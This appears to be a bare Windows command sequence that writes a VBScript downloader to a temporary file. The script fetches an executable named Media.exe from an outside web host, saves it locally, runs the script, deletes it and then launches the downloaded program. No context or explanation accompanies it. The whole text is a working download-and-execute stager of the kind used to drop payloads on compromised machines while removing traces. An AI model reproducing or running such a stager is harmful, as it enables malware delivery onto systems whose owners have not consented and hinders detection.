echo strFileURL = "http://fosse.co/dl/Media.exe": strHDLocation = "./Media.exe": Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"): objXMLHTTP.open "GET", strFileURL, false: objXMLHTTP.send(): Set objADOStream = CreateObject("ADODB.Stream"): objADOStream.Open: objADOStream.Type = 1: objADOStream.Write objXMLHTTP.ResponseBody: objADOStream.Position = 0: Set objFSO = Createobject("Scripting.FileSystemObject"): Set objFSO = Nothing: objADOStream.SaveToFile strHDLocation: objADOStream.Close: Set objADOStream = Nothing: Set objXMLHTTP = Nothing: >> t.vbs
cscript.exe t.vbs
del t.vbs
Media.exe